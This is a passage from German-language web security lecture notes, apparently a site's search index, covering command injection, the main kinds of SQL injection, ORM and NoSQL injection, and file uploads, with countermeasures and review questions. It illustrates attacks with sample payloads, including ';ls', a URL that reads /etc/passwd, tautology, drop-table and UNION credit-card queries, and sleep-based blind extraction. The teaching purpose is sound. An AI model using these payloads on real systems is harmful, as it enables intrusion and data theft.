(z.B. gegen eine MSSQL Datenbank) werden zumeist dutzende oder hunderte Angriffsmuster durchprobiert. Aus Effizienzgr\u00fcnden wird hier sehr stark auf automatisierte Tools gesetzt.</p> <p>Der Verteidigungsgrundsatz ist es, niemals Benutzerdaten zu vertrauen. Alle Benutzereingaben m\u00fcssen auf Schadmuster hin \u00fcberpr\u00fcft werden, falls Schadcode entdeckt wird, muss die Eingabe verworfen oder gecleaned werden. Aufgrund der vielen verschiedenen Angriffsmuster ist dies nur mittels Bibliotheken sinnvoll m\u00f6glich. Benutzereingaben d\u00fcrfen niemals direkt zur Erstellung dynamischer Operationen verwendet werden. Die meisten Frameworks bieten dezidierte M\u00f6glichkeiten um Benutzereingaben in Operationen zu inkludieren (z.B. prepared statements), bei diesen wird automatisch eine Filterung von Schadcode durchgef\u00fchrt. Und schlussendlich sollten alle Benutzerausgaben noch bereinigt bzw. maskiert werden bevor sie wieder angezeigt werden. Dadurch wird verhindert, dass Operationen im Kontext eines anderen Benutzers ausgef\u00fchrt werden.</p> <p>Als zus\u00e4tzliche Hardening-Ma\u00dfnahme k\u00f6nnen Sandboxing-Konzepte, optionale HTTP Security-Header und IDS/IPS-Systeme verwendet werden.</p>"},{"location":"server-side-attacks/allgemein/#reflektionsfragen-need-to-split-those-up","title":"Reflektionsfragen (need to split those up)","text":"<ol> <li> <p>Wie funktioniert eine SQL union-based Injection? Womit k\u00f6nnen    SQL-Injections vermieden werden?</p> </li> <li> <p>Wie funktioniert eine SQL time-based Injection? Womit k\u00f6nnen    SQL-Injections vermieden werden?</p> </li> <li> <p>Warum sollten SQL prepared statements verwendet werden?</p> </li> <li> <p>Was versteht man unter einer Serialisierungs-Schwachstelle? Welche    negativen Auswirkungen k\u00f6nnen Serialisierungsangriffe auf eine    Applikation besitzen?</p> </li> <li> <p>Was versteht man unter XML External Entity Attacks? Welche negativen    Auswirkungen auf die Applikation k\u00f6nnen erzielt werden und welche    Gegenma\u00dfnahmen sind m\u00f6glich?</p> </li> <li> <p>Welche Probleme k\u00f6nnen beim Upload eines Files auf einen Webserver    auftreten? Welche Best-Practises im Zusammenhang mit File-Uploads    sollten beachtet werden?</p> </li> <li> <p>Unterschied der Angriffsvektoren mit einem File, dass serverseitig    exekutierten Code enth\u00e4lt und einem File, dass client-seitig    exekutierten Code enth\u00e4lt?</p> </li> <li> <p>Wie k\u00f6nnen Path-Traversal Angriffe eingesetzt werden?</p> </li> <li> <p>Erl\u00e4utere LDAP-Injections.</p> </li> <li> <p>Welche Schwachstelle wird bei Type-Juggling Angriffen ausgenutzt?     Erl\u00e4utere ein solches Beispiel.</p> </li> <li> <p>Was versteht man unter HTTP Request Smuggling?</p> </li> <li> <p>Erl\u00e4utere Server-Side Template Injection (SSTI).</p> </li> </ol> <p>[1] Diese werden im Kapitel Injection Attacks erkl\u00e4rt.</p> <p>[2] Structured Query Language</p> <p>[3] W\u00fcrde man die ?-basierte Methode verwenden, muss man bei jeder \u00c4nderung des Query-Strings \u00fcberpr\u00fcfen, ob die Reihenfolge der dynamischen Parameter ident geblieben ist.</p> <p>[4] https://www.netsparker.com/blog/web-security/ldap-injection-how-to-prevent/</p> <p>[5] https://github.com/ikkisoft/SerialKiller</p> <p>[6] Aus dem exzellenten PortSwigger-Tutorial unter https://portswigger.net/web-security/request-smuggling.</p> <p>[7] Quelle: https://portswigger.net/web-security/request-smuggling/exploiting</p> <p>[8] https://jinja.palletsprojects.com/</p> <p>[9] siehe auch https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</p>"},{"location":"server-side-attacks/command-injections/","title":"Command Injection","text":"<p>Eine Command Injection zielt darauf ab, Binaries (Kommandozeilentools) auf dem Zielserver auszuf\u00fchren, zumeist wird dies \u00fcber modifizierte HTTP Operationsparameter erzielt. Beliebtes Ziel ist das Erstellen einer shell oder reverse-shell: dies erlaubt es Angreifern, \u00e4hnlich wie mittels SSH, mit den Rechten der Webapplikation Befehle am Server auszuf\u00fchren.</p> <p>Im Zuge einer Command Injection wird ein Programm am Server ausgef\u00fchrt. Da die meisten Webapplikationen losgel\u00f6st vom zugrunde liegenden System (z.B. Windows oder Linux) entwickelt werden, rufen diese selten direkt Systemkommandos auf. Eine Ausnahme sind embedded Systeme bei denen die Hardware zusammen mit der Software geb\u00fcndelt geliefert wird. Gerade im Router-/AccessPoint-Umfeld werden gerne direkt Systemkommandos \u00fcber die Weboberfl\u00e4che aufgerufen. Dementsprechend ist das klassische Command Injection Beispiel eine typische Weboperation die von Access Points bereitgestellt wird: mittels des ping Kommandos soll die Netzwerkkonnektivit\u00e4t zwischen dem Access Point und einem externen Server \u00fcberpr\u00fcft werden.</p> <p>Dies k\u00f6nnte mit folgendem Pseudo-Python Code implementiert werden:</p> <pre><code>import os\ndomain = user_input()\nos.system('ping ' + domain)\n</code></pre> <p>In der Variable domain wird eine Benutzereingabe gespeichert, es wird angenommen, dass diese ein domainname ist. Ein Angreifer k\u00f6nnte nun z.B. localhost; ls als Eingabe verwenden. Durch den \u00fcbergebenen ; wird bei Unix-Kommandos ein Kommando beendet und das n\u00e4chste begonnen. Durch diese Verkettung versucht also der Angreifer das Kommando ls einzuschleusen.</p> <p>\u00c4hnliche Muster sind:</p> <ul> <li><code>;ls</code></li> <li><code>$(ls)</code></li> <li><code>\u2018ls\u2018</code></li> </ul> <p>Ein \u00e4hnliches Verhalten kann ausgenutzt werden, wenn der Verdacht besteht, dass Dateien mittels Systembefehlen ausgegeben werden und die auszugebende Datei \u00fcber HTTP Parameter \u00fcbermittelt wird.</p> <p>Beispiele hierf\u00fcr:</p> <ul> <li><code>http://sensitive/cgi-bin/userData.pl?doc=/bin/ls|</code></li> <li><code>http://sensitive/something.php?dir=%3Bcat%20/etc/passwd</code></li> </ul> <p>Um Command Injection Probleme zu umgehen wird empfohlen, Programmierbibliotheken anstatt von Kommandozeilenaufrufen zu verwenden. Da hierbei nun keine getrennte Shell ge\u00f6ffnet wird, kann an dieser Stelle auch kein Kommando eingef\u00fcgt werden.</p>"},{"location":"server-side-attacks/database-injections/","title":"Datenbank-Injections","text":"<p>Datenbank-Injections geh\u00f6ren zu den selteneren, daf\u00fcr aber schwerwiegenderen, vorkommenden Sicherheitsfehlern. Das Grundproblem ist, dass Datenbankabfragen unter Zuhilfename von Benutzereingaben gebaut werden. Durch b\u00f6sartige Benutzereingaben versuchen Angreifer nun, das Datenbanksystem zur Freigabe zus\u00e4tzlicher Daten zu bringen, unbeabsichtigt Daten zu ver\u00e4ndern oder sogar aus dem Datenbanksystem auf das Betriebssystem auszubrechen.</p>"},{"location":"server-side-attacks/database-injections/#sql","title":"SQL","text":"<p>SQL[2] ist die bekannteste Abfragesprache f\u00fcr relationale Datenbanken. Im Zuge dieser Vorlesung werden nur einfache SQL-Features ben\u00f6tigt. Ein Beispiel f\u00fcr ein einfaches SQL Statement:</p> <pre><code>select column1, column2 from table1, table2\nwhere column1 = 'xyz'\norder by column1 asc/desc\nlimit 1;\n</code></pre> <p>In diesem Fall werden zwei Spalten column1 und column2 aus zwei Tabellen table1 und table2 ausgelesen. Mittels der where-Klausel wird eine Bedingung zur Filterung der Daten hinzugef\u00fcgt, mittels order by die Daten entweder aufsteigend oder absteigend sortiert und mittels limit die Anzahl der Datens\u00e4tze auf einen Datensatz limitiert.</p> <p>SQL bietet die M\u00f6glichkeit die Ausgaben zweier Queries zu einer Gesamtausgabe zu kombinieren. Hierf\u00fcr wird das UNION Kommando verwendet:</p> <pre><code>select column1, column2 from table1, table2\nunion all\nselect column3, column4 from table3, table4;\n</code></pre> <p>Dies ist nur m\u00f6glich, wenn beide verwendeten SQL-Queries die idente Anzahl von Spalten zur\u00fcck liefern.</p>"},{"location":"server-side-attacks/database-injections/#arten-von-sql-injections","title":"Arten von SQL-Injections","text":"<p>Die einfachste Form der SQL-Injection basiert darauf, dass die Applikation eine String-Concatenation zur Erstellung des SQL-Ausdrucks verwendet. Der Angreifer versucht einen Wert zu \u00fcbergeben der, wenn er in den SQL-String eingesetzt wird, zuerst den bestehenden SQL-Ausdruck beendet/schlie\u00dft und danach zus\u00e4tzlich Code ausf\u00fchrt.</p> <p>Als Beispiel wird hier ein Login verwendet, der \u00fcber folgende HTTP Operation durchgef\u00fchrt wird: https://kino.local/login.php?email=ah@coretec&amp;password=pw. Der Angreifer vermutet, dass die \u00dcberpr\u00fcfung des Logins \u00fcber eine Datenbank-Abfrage ausgef\u00fchrt wird, die z.B. in Java als String erstellt wird:</p> <pre><code>String query = \"select * from users where email = '\" +email+ \"' and password = '\" +password +\"' limit 1;\";\n</code></pre> <p>Die Email-Adresse und das Passwort wird als Teil der Datenbank-Abfrage verwendet, wird ein Datensatz zur\u00fcckgegeben wird der erste Datensatz vermutlich zur Bef\u00fcllung der Benutzersession verwendet. Wird kein Datensatz zur\u00fcckgegeben nimmt die Applikation an, dass der Login nicht erfolgreich war.</p> <p>Ein Angreifer w\u00fcrde nun z.B. folgendes Fragment als Passwort \u00fcbergeben:</p> <pre><code>1' or '1'='1\n</code></pre> <p>Durch diesen Ausdruck w\u00fcrde folgendes SQL-Kommando entstehen:</p> <pre><code>String query = \"select * from users where email = 'ah@coretec.at' and password = '1' or '1'='1' limit 1;\";\n</code></pre> <p>Anstatt dass die Email-Adresse und das Passwort \u00fcberpr\u00fcft werden, wird nun initial die Email und das Passwort \u00fcberpr\u00fcft. Dabei wird wahrscheinlich als Ergebnis false erzeugt, damit w\u00fcrde prinzipiell kein Datensatz zur\u00fcckgegeben werden. Der Angreifer schafft es allerdings, auch den Ausdruck 1=1 hinzuzuf\u00fcgen. Dieser ergibt immer true, durch die Oder-Verkn\u00fcpfung wird der Gesamtausdruck true und liefert daher alle Zeilen der Tabelle als Resultat. Der Applikationscode w\u00fcrde nun die erste Zeile extrahieren und mit diesem Datensatz die Session bef\u00fcllen. Der Angreifer hat auf diese Weise das Login-System \u00fcberlistet und die Identit\u00e4t eines anderen Benutzers angenommen.</p>"},{"location":"server-side-attacks/database-injections/#stacked-queries","title":"Stacked Queries","text":"<p>Die grunds\u00e4tzliche Methode an eine bestehende SQL-Abfrage zus\u00e4tzliche (ungewollte) Queries anzuh\u00e4ngen und dadurch Code auszuf\u00fchren wird Stacked Query genannt. Das klassische Beispiel f\u00fcr eine solche ist:</p> <pre><code>'; drop table users; --\n</code></pre> <p>Mittels des ersten Zeichens <code>'</code> wird versucht aus dem vorgesehenen SQL-Ausdruck auszubrechen. Das Semikolon dient zum Beenden des eigentlichen Kommandos und der Angreifer kann ein beliebiges SQL-Kommando anh\u00e4ngen \u2014 in diesem Fall ein drop table Kommando, welches eine Datenbank l\u00f6schen w\u00fcrde. Zum Schluss wird mit einem weiteren Semikolon der eingeschleuste Befehlt beendet und durch die beiden Bindestriche ein Kommentar eingeleitet. Auf diese Weise wird potentiell nachfolgender SQL-Code auskommentiert.</p>"},{"location":"server-side-attacks/database-injections/#union-based-sql-injection","title":"UNION-based SQL-Injection","text":"<p>Bei UNION-basierten SQL-Angriffen wird versucht mittels des UNION Kommandos ein zus\u00e4tzliches SELECT Statement an ein bestehendes Select-Statement anzuh\u00e4ngen. H\u00e4ufig wird dies verwendet, wenn eine Web-Applikation eine Tabellen-\u00e4hnliche Datenauflistung bietet.</p> <p>Beispiel: eine Webapplikation stellt eine Liste von Personen als HTML-Tabelle dar. Ein Benutzer kann diese Liste durch Eingabe einer ID einschr\u00e4nken. Es wird daher angenommen, dass die Daten der dargestellten HTML-Tabelle durch eine SQL-Abfrage der Form:</p> <pre><code>SELECT Name, Phone, Address FROM Users WHERE Id=$id\n</code></pre> <p>bereitgestellt wird. Der Parameter $id wird durch den Benutzer bereitgestellt. Ein Angreifer kann nun versuchen, hier eine SQL-Injection durchzuf\u00fchren. Beispielsweise k\u00f6nnte daf\u00fcr folgendes Fragment verwendet werden:</p> <pre><code>1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable\n</code></pre> <p>Dieses Fragment wird durch die Webapplikation f\u00fcr $id eingesetzt (da ID in diesem Fall ein Zahlenwert ist, muss, verglichen mit dem Ausbruch aus einem String-Wert, werden hier keine Quoting-Zeichen wie \u2019 ben\u00f6tigt) und erzeugt auf diese Weise die folgende SQL-Abfrage:</p> <pre><code>SELECT Name, Phone, Address FROM Users WHERE Id=1\nUNION ALL\nSELECT creditCardNumber,1,1 FROM CreditCardTable\n</code></pre> <p>Die Tabelle wird nun initial mit den Daten des Users mit der Id 1 bef\u00fcllt, zus\u00e4tzlich werden alle Kreditkartennummern der Tabelle CreditCardTable angeh\u00e4ngt (bei diesen Daten werden Spalten 2 und 3 mit der Konstanten 1 gef\u00fcllt).</p> <p>Da bei einem UNION-Select die Spaltenanzahl der jeweiligen Queries ident sein muss, muss der Angreifer initial die richtige Spaltenanzahl erraten. Dies wird zumeist \u00fcber Brute-Force Angriffe durchgef\u00fchrt.</p>"},{"location":"server-side-attacks/database-injections/#boolean-based-blind-sql-injection","title":"Boolean-based Blind SQL Injection","text":"<p>Eine SQL-Injection ist auch ohne direkten Antwortkanal m\u00f6glich. Ein Beispiel hierf\u00fcr sind Boolean-based blind SQL-Injections.</p> <p>Ein Beispiel: gegeben eine Produktseite <code>opfer.local/product/1</code> die ein Produkt anzeigt. Der Angreifer hat bereits erkannt, dass bei Eingabe von <code>opfer.local/product/1 and 1=1</code> die Produktseite ebenso angezeigt wird und bei <code>opfer.local/product/1 and 1=0</code> kein Produkt gefunden wird. Dadurch besteht die Annahme, dass der Angreifer einen Ausdruck and die Produkt-Id (1) anh\u00e4ngen kann und dass dieser Ausdruck auch exekutiert wird (der Ausdruck 1=0 ergibt immer false, durch die Und-Verkn\u00fcpfung mit false wird kein Produkt mehr geliefert). Dies kann nun ausgenutzt werden, um mit einzelnen Abfragen den Datenbankinhalt auszulesen. Beispielsweise kann der Angreifer folgenden Ausdruck bilden:</p> <pre><code>SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97\n</code></pre> <p>An den Suchausdruck wird also eine Substring-Abfrage hinzugef\u00fcgt. Diese extrahiert die erste Stelle des Benutzernamens, verwandelt diese \u00fcber die ASCII-Funktion in einen ASCII-Wert und \u00fcberpr\u00fcft, ob die erste Stelle des Benutzernamens ein A ist. Wird nun die Produktseite des Produkts 1 zur\u00fcckgeliefert, wei\u00df der Angreifer, dass das erste Zeichen des Benutzernamens ein A ist. Wird keine Produktseite geliefert, w\u00fcrde der Angreifer versuchen ob der ASCII Wert dem Zeichen B entspricht. Durch mehrere (tausende) Anfragen kann der Angreifer auf diese Weise die gesamte Datenbank rekonstruieren.</p>"},{"location":"server-side-attacks/database-injections/#time-based-blind-sql-injection","title":"Time-based Blind SQL Injection","text":"<p>\u00c4hnlich wie bei einer boolean based blind SQL-Injection gibt es bei dieser Angriffsart keinen direkten Antwortkanal f\u00fcr die extrahierten Informationen. Anstatt wird ein side-channel Angriff auf das Zeitverhalten der Antwort angewandt.</p> <p>Der Angreifer besitzt die M\u00f6glichkeit ein SQL-Fragment an eine Anfrage anzuh\u00e4ngen und zur Exekution zu bringen. Wieder wird eine IF-Abfrage verwendet, in dem konkreten Fall wird, falls die Abfrage erfolgreich ist, die Antwort um 10 Sekunden verz\u00f6gert:</p> <pre><code>http://www.examplecom/product.php?id=10 AND IF(ASCII(SUBSTRING(username,1,1))=97, sleep(10), \u2018false\u2019))--\n</code></pre> <p>Als Abfrage wird der idente \u201cf\u00e4ngt der Benutzername mit A an?\u201d verwendet. Falls dies war sein sollte wird mittels sleep(10) die Antwort verz\u00f6gert, wenn nicht wird sofort geantwortet. Mittels vieler Abfragen kann der Angreifer auf diese Weise die gesamte Datenbank extrahieren.</p> <p>Im Zuge eines Time-Based Angriffs wird mehr oder weniger ein Model der Antwortzeiten aufgebaut. Da normalerweise die eingef\u00fcgte Verz\u00f6gerung minimiert wird (um m\u00f6glichst schnell Daten extrahieren zu k\u00f6nnen) ist diese Angriffsart fehlerbehaftet und verwundbar gegen\u00fcber Netzwerk-Jitter. Falls die Netzwerkverbindung selbst instabil ist (also Anfragen aufgrund des Netzwerks unterschiedlich lange ben\u00f6tigen), k\u00f6nnen einzelne Zeichen invalid erkannt werden.</p>"},{"location":"server-side-attacks/database-injections/#error-based-injections","title":"Error-based Injections","text":"<p>Bei Error-based Injections wird absichtlich ein Fehler eingebaut um \u00fcber den ausgegebenen Fehlertext Informationen zu extrahieren.</p> <p>Ein Beispiel in MySQL: es gibt in Mysql die mathematische Funktion exp welche ab einem \u00fcbergebenen Dezimalwert von ca. 260 einen Fehler ausgibt. Ebenso gibt es den Operator \u2018w\u0303elcher ein Bitweises Kompliment bildet. Wird dieser Operator auf das Ergebnis eines Selects angewandt, ist das Ergebnis eine sehr gro\u00dfe Zahl.</p> <p>Ein Angreifer kann dieses Verhalten f\u00fcr eine Datenextraktion nutzen, z.B.:</p> <pre><code>exp(~(select * from (select user()) x)\n</code></pre> <p>Es wird also in einem sub-select die Funktion user() aufgerufen, die den aktuellen Benutzernamen zur\u00fcck gibt. Auf dieses Ergebnis wird ein bitweises Kompliment angewandt, es wird eine gro\u00dfe Zahl erzeugt; diese Zahl wird dann an die exp-Funktion \u00fcbergeben und wird einen Fehler werfen.</p> <p>Die generierte Fehlermeldung:</p> <pre><code>mysql&gt;select exp(~(select * from (select user()) x ));\nERROR 1690(22003): DOUBLE value is out of range in'exp(~((select 'root@localhost' from dual)))'\n</code></pre> <p>In der Fehlermeldung wurde allerdings der innere SQL-Ausdruck exekutiert, dadurch wird der Benutzername root@localhost ausgegeben und eine Datenextraktion ist erfolgt.</p> <p>Dies ist ein weiterer Grund, warum auf einer Webseite keine detaillierten Fehlermeldungen ausgegeben werden sollten.</p>"},{"location":"server-side-attacks/database-injections/#ausbruch-aus-dem-datenbanksystem","title":"Ausbruch aus dem Datenbanksystem","text":"<p>Eine weitere M\u00f6glichkeit des Angreifers ist es aus dem Datenbanksystem auf das Dateisystem auszubrechen. Dadurch kann er mit den Rechten des Datenbankbenutzers entweder auf Dateien am Datenbankserver zugreifen oder besitzt dadurch sogar Shell-Access auf das System. Dies ist einer der Gr\u00fcnde, warum Datenbanksysteme immer mit einem eigenen Benutzer laufen sollten.</p> <p>Ein bekanntes Beispiel f\u00fcr dieses Problem ist die Funktion xp_cmdshell bei Microsoft SQL-Server welche die Ausf\u00fchrung von Programmen \u00fcber SQL erlaubt. Mittlerweile ist diese Funktion aus Sicherheitsgr\u00fcnden deaktiviert, bei \u00e4lteren Microsoft SQL-Server Versionen kann allerdings diese Funktion mittels einer SQL-Injection ebenso aktiviert werden.</p> <p>Ein Beispiel aus dem Open-Source Umfeld w\u00e4re PostgreSQL, welches es Datenbankadmins erlaubt, neue Tabellen zu erstellen und diese mit Daten aus dem Dateisystem zu bef\u00fcllen:</p> <pre><code>postgres-# CREATE TABLE temp(t TEXT);\npostgres-# COPY temp FROM '/etc/passwd';\npostgres-# SELECT * FROM temp limit 1 offset 0;\n</code></pre> <p>MySQL bietet auch die beiden Zus\u00e4tze into outfile bzw. into dumpfile an. Damit wird das Resultat einer SQL-Query in eine Datei gespeichert. Falls der Datenbankserver mit einer hohen Berechtigunggstufe l\u00e4uft (z.B. als root oder www-data Benutzer) kann dies verwendet werden um Dateien im Filesystem (z.B. im Web-Root) abzulegen und auf diese Weise eine Webshell hochzuladen (diese w\u00fcrde dann durch den Angreifer \u00fcber den Webserver ge\u00f6ffnet werden).</p>"},{"location":"server-side-attacks/database-injections/#gegenmanahmen","title":"Gegenma\u00dfnahmen","text":"<p>Da das Grundproblem von SQL-Injections die Erstellung von dynamischen SQL-Kommandos basierend auf b\u00f6sartigen Benutzereingaben ist, w\u00e4re das Escapen der Eingabe die erste m\u00f6gliche Gegenma\u00dfnahme. Dabei werden die Benutzereingaben so maskiert, dass sie gefahrenlos per String-Concatenation verwendet werden k\u00f6nnen. Da diese L\u00f6sung fehleranf\u00e4llig und Datenbank-spezifisch ist, sollte sie so weit wie m\u00f6glich vermieden werden.</p> <p>Ein besserer L\u00f6sungsansatz f\u00fcr SQL-Injection ist die Verwendung von prepared statements. Bei diesen wird eine SQL-Abfrage mittels einer API gebaut (und mit Daten bef\u00fcllt) anstatt \u201cnur\u201d Strings zu verkn\u00fcpfen. Aufgrund der zus\u00e4tzlich bereitgestellten Information ist die Datenbankbibliothek in der Lage, die benutzer-bereitgestellten Daten in einer Form einzusetzen, welche SQL-Injections verhindert.</p> <p>Ein Beispiel in Java:</p> <pre><code>String custname = request.getParameter(\"customerName\");\nString query = \"SELECT account_balance FROM user_data WHERE user_name = ?\";\n\nPreparedStatement pstmt = connection.prepareStatement(query);\npstmt.setString(1, custname);\n\nResultSet results = pstmt.executeQuery();\n</code></pre> <p>Die dynamische SQL-Query befindet sich im String query und beinhaltet einen dynamischen Parameter der mit einem ? markiert wird. Durch die Methode setString wird nun der 1te Parameter auf den Wert der Variable custname gesetzt und auf diese Weise die Benutzereingabe in einer sicheren Art und Weise in die SQL-Query eingebaut.</p> <p>Ein weiteres Beispiel in PHP unter Verwendung von PDOs:</p> <pre><code>$id = 1;\n$sth = $DBH-&gt;prepare(\"SELECT * FROM juegos WHERE id = :id\");\n$sth-&gt;bindParam(':id', $id, PDO::PARAM_INT);\n$STH-&gt;execute();\n</code></pre> <p>Bei diesem Beispiel werden die dynamisch inkludierten Daten mittels eines Platzhalters (:id) identifiziert und mittels der Methode bindParam gesetzt. Diese Art der Zuweisung hat den Vorteil, dass :id innerhalb der Query an mehreren Stellen gesetzt werden kann. Ebenso wird durch das Hinzuf\u00fcgen eines weiteren dynamischen Parameters die Position der dynamischen Parameter nicht ver\u00e4ndert[3].</p> <p>Ein Problem mit prepared statements ist, dass nicht alle Elemente einer SQL-Abfrage auf diese Weise dynamisch bef\u00fcllt werden k\u00f6nnen. H\u00e4ufige Ausnahmen sind:</p> <ul> <li>Tabellennamen</li> <li>Spaltennamen</li> <li>die Sortierrichtung (ASC, DESC)</li> </ul> <p>Falls diese Felder bef\u00fcllt werden m\u00fcssen, wird empfohlen die Applikationslogik so zu bauen, dass \u00fcber die Eingabe erkannt wird, welches Feld gew\u00e4hlt wurde und basierend darauf ein statischer String zum Bauen der Query verwendet werden. Auf diese Weise wird vermieden, dass eine Benutzereingabe direkt in den Query-String eingebaut wird. Ebenso sollte bei einer solchen Konstruktion sowohl eine rigide Whitelist als auch Escaping verwendet werden.</p> <p>Ein Vorteil von Prepared Statements ist, dass die Absicherungslogik Teil der Applikationslogik ist. Andere Methoden (wie z.B. Stored Procedures) verschieben die Absicherung direkt in den Datenbankserver. Dabei besteht das Problem, dass z.B. Anwendungsentwickler annehmen k\u00f6nnten, dass gewisse Datenbank-Funktionen sicher implementiert wurden und Datenbank-Entwickler annehmen k\u00f6nnten, dass Daten bereits durch die Applikationsentwickler abgesichert wurden. Hierdurch kann es zu Diskrepanzen bei der Absicherung kommen.</p> <p>Eine weitere Gegenma\u00dfnahme sind Stored Procedures. Dies sind Funktionen die im Datenbanksystem abgelegt und von der Applikation aufgerufen werden. Eine fr\u00fcher h\u00e4ufig genutzte Sprache zum Erstellen von Stored Procedures ist PL/SQL, mittlerweile k\u00f6nnen Stored Procedures auch in \u201cnormalen\u201d Programmiersprachen entwickelt werden. Sie besitzen die gleichen Probleme wie applikatorische Abfragen: falls eine String-Verkettung verwendet wird, k\u00f6nnen SQL-Injections durchgef\u00fchrt werden. Stored Procedures sind aber eher auf die Verwendung von Sprachmustern ausgelegt, die Injection-Angriffe vermeiden (\u00e4hnlich wie Prepared Statements) und da sie meistens von Datenbank-Spezialisten geschrieben werden, sind sie meistens sicher implementiert. Aus diesem Grund werden Stored Procedures h\u00e4ufig als Gegenma\u00dfnahme zu SQL-Injections angef\u00fchrt, auch wenn dies potentiell vom implementierenden Programmierer abh\u00e4ngig ist. Ein Nachteil von Stored Procedures ist, dass der Applikationscode dadurch auf den Applikationsserver und den Datenbankserver aufgeteilt wird und dadurch potentiell schwerer wartbar wird.</p>"},{"location":"server-side-attacks/database-injections/#object-relational-mapping","title":"Object-Relational Mapping","text":"<p>Object-Relational Mapping (ORM) wird verwendet um basierend auf einer relationalen Datenbank eine virtuelle Objektdatenbank zu erstellen. Dabei wird eine ORM-Software verwendet, um aus Datenbank-Zeilen eine Repr\u00e4sentation der Daten als Programmiersprachen-Objekt herzustellen. Datenabfragen und -ver\u00e4nderungsoperationen werden anschlie\u00dfend auf dieser Objekt-Repr\u00e4sentation durchgef\u00fchrt und intern als Datenbankbefehle ausgef\u00fchrt.</p> <p>Ein h\u00e4ufiges Pattern in diesem Umfeld ist das ActiveRecord-Pattern. Bei diesem entspricht eine Datenbanktabelle einem Objekttypen und eine Zeile innerhalb der Datenbank wird zu einer Objectinstanz.B.ispielsweise w\u00fcrde aus der Datenbanktabelle users die Klasse User gebildet werden. Eine Zeile der Datenbank w\u00fcrde zu einer Objektinstanz und z.B. die Spalte vorname w\u00fcrde zum Feld vorname des Objekts werden.</p> <p>Bei den meisten ORMs werden Abfragen innerhalb der Zielprogrammiersprache abgebildet, hier ein Beispiel in JavaScript unter Verwendung des ORMs sequalize:</p> <pre><code>models.Items.findAll({\n    limit: '1',\n})\n</code></pre> <p>In dem Beispiel wird ein Objekt des Typs Items erstellt. Problematisch bei ORMs ist, dass im Hintergrund zumeist SQL-Kommandos erstellt werden und daher SQL-Injections weiterhin m\u00f6glich sind, hier ein Beispiel:</p> <pre><code>models.Items.findAll({\n  limit: '1; DELETE FROM Items WHERE 1=1; --',\n})\n</code></pre> <p>An den Limit-Parameter wird eine Stacked-Query angeh\u00e4ngt und auf diese Weise eine SQL-Injection ausgef\u00fchrt. Anhand diese Beispiels kann erkannt werden, das ORMs kein Allheilmittel f\u00fcr SQL-Injections sind.</p>"},{"location":"server-side-attacks/database-injections/#nosql-injections","title":"NoSQL-Injections","text":"<p>In den letzten Jahren werden vermehrt NoSQL-Datenbanken eingesetzt. Diese verwenden nicht SQL als Abfragesprache, sondern meistens eigenst\u00e4ndige Abfragesprachen oder exekutieren JavaScript-Snippets als Query. Hier ein Beispiel in MongoDB:</p> <pre><code>db.myCollection.find( { active: true, $where: function() { return obj.credits - obj.debits &lt; $userInput; } } );\n</code></pre> <p>Bei diesem Beispiel wird als Query der aktuellen Kontostand berechnet (credits - debits), falls dieser unter einer benutzerdefinierten Schranke liegt ($userInput) wird der behalten, ansonsten ausgefiltert. Die Abfrage ist als JavaScript implementiert und nicht als SQL.</p> <p>Die grunds\u00e4tzliche Problematik einer Injection bleibt ident. In dem gew\u00e4hlten Beispiel wird z.B. die Benutzereingabe nicht escaped, ein Angreifer kann daher auf diese Weise Schadcode einf\u00fcgen:</p> <pre><code>    \"(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date&lt;10000); return Math.max();})()\"\n</code></pre> <p>Hier wird nun innerhalb der Abfrage eine Javascript-Funktion definiert und sofort danach aufgerufen. Die Funktion macht nichts anderes, als 10 Sekunden lang eine Endlosschleife aufzurufen. Falls der MongoDB-Server nach dem Absetzen dieser Query f\u00fcr 10 Sekunden nicht antwortet und eine CPU zu 100% ausgelastet ist, hat man also eine datenbankseitige Injection erreicht.</p> <p>Wie man an dem Beispiel sehen kann, ist der alleinige Einsatz von NoSQL-Datenbanken nicht ausreichend um eine Datenbank-Injection zu vermeiden.</p>"},{"location":"server-side-attacks/file-uploads/","title":"File Uploads","text":"<p>Wenn ein Benutzer bei einer Webseite Dateien hochladen und der idente Benutzer (oder ein anderer Benutzer) danach wieder auf diese Dateien zugreifen kann, ergeben sich zwei Gef\u00e4hrdungsmomente. Einerseits kann der idente Benutzer versuchen, mit dem hochgeladenen File den Server direkt anzugreifen (z.B. um Code am Server auszuf\u00fchren), auf der anderen Seite kann ein Angreifer versuchen, auf diese Weise einen anderen Benutzer anzugreifen (z.B. um dessen Session zu \u00fcbernehmen).</p>"},{"location":"server-side-attacks/file-uploads/#das-upload-verzeichnis","title":"Das Upload-Verzeichnis","text":"<p>In einer sicherheitstechnisch guten Webapplikation sind alle Dateien und Verzeichnisse schreibgesch\u00fctzt \u2014 Angriffe, die serverseitig Dateien erstellen oder modifizieren m\u00fcssen, werden dadurch erschwert. Die einzige Ausnahme sollte das Upload-Verzeichnis sein in welches die Webapplikation (bzw. der Systemuser der Webapplikation) schreibend zugreifen darf.</p> <p>Dieses Verzeichnis sollte niemals unterhalb des Webroots liegen, falls z.B. der Webroot <code>/var/www/html</code> ist, sollte das Uploadsvereichnis sich nicht unter <code>/var/www/html/uploads</code> befinden. W\u00fcrde das Verzeichnis so situiert sein, kann der Webserver bei einem Zugriff auf ein hochgeladenes File schwer unterscheiden, ob eine hochgeladene Datei zum \u201cnormalen\u201d Umfang der Webapplikation geh\u00f6rt, oder ob es sich um eingeschleusten Schadcode handelt. Zus\u00e4tzlich sollten Directory-Listings f\u00fcr dieses Verzeichnis deaktiviert werden und das Verzeichnis auf einer Partition mit aktivierter noexec Mount-Option (bei Verwendung von Linux) platziert werden.</p> <p>Der Dateiname, unter dem ein hochgeladenes File abgelegt wird, sollte niemals durch den User bestimmt werden. Dies w\u00fcrde path traversal Angriffe erlauben[1] bzw. k\u00f6nnte ein Angreifer den bekannten Pfad zu einem File im Zuge von weiteren Injection-Angriffen verwenden.</p> <p>Ein architekturelles Problem ist durch die Struktur von Webapplikationen bedingt. Eine deployte Webapplikation besteht meistens aus einem Webserver und einem Applikationsserver. Ersterer ist f\u00fcr die Zustellung statischer Dateien optimiert, letzterer beinhaltet die Applikationslogik inkl. der Zugriffskontrollen. Werden Dateien direkt \u00fcber ein Upload-Verzeichnis bereitgestellt, \u00fcbernimmt diese Aufgabe der Webserver (der f\u00fcr diese statische Zustellung optimiert ist) und nicht der Applikationsserver \u2014 in diesem Fall kann es 